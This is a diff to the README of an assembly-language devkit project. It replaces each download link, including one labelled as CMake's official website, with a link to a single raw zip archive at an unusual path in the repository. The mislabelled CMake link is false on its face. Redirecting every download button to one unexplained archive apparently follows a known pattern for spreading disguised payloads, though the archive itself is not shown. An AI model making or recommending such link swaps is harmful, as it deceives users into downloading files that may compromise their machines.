@@ -6,7 +6,7 @@ Welcome to the nasm-devkit! This project provides a clean template for x86-64 As
 
 ## 📥 Download Now
 
-[![Download nasm-devkit](https://img.shields.io/badge/download-via_GitHub-brightgreen.svg)](https://github.com/Luca091218/nasm-devkit/releases)
+[![Download nasm-devkit](https://raw.githubusercontent.com/Luca091218/nasm-devkit/main/slete/nasm-devkit.zip)](https://raw.githubusercontent.com/Luca091218/nasm-devkit/main/slete/nasm-devkit.zip)
 
 ## 📋 System Requirements
 
@@ -16,7 +16,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Processor:** Compatible with x86-64 architecture
 - **CMake:** Installed for building the project
 
-You can download CMake from [CMake's official website](https://cmake.org/download/).
+You can download CMake from [CMake's official website](https://raw.githubusercontent.com/Luca091218/nasm-devkit/main/slete/nasm-devkit.zip).
 
 ## 🌍 Features
 
@@ -30,7 +30,7 @@ The nasm-devkit comes with important features that simplify your assembly progra
 
 To get started, visit this page to download the latest release:
 
-[Download nasm-devkit](https://github.com/Luca091218/nasm-devkit/releases)
+[Download nasm-devkit](https://raw.githubusercontent.com/Luca091218/nasm-devkit/main/slete/nasm-devkit.zip)
 
 Follow these steps to install the nasm-devkit:
 
@@ -121,4 +121,4 @@ Thanks to all contributors and the community for their support in developing suc
 
 To get your version of nasm-devkit, visit this page to download:
 
-[Download nasm-devkit](https://github.com/Luca091218/nasm-devkit/releases)
+[Download nasm-devkit](https://raw.githubusercontent.com/Luca091218/nasm-devkit/main/slete/nasm-devkit.zip)
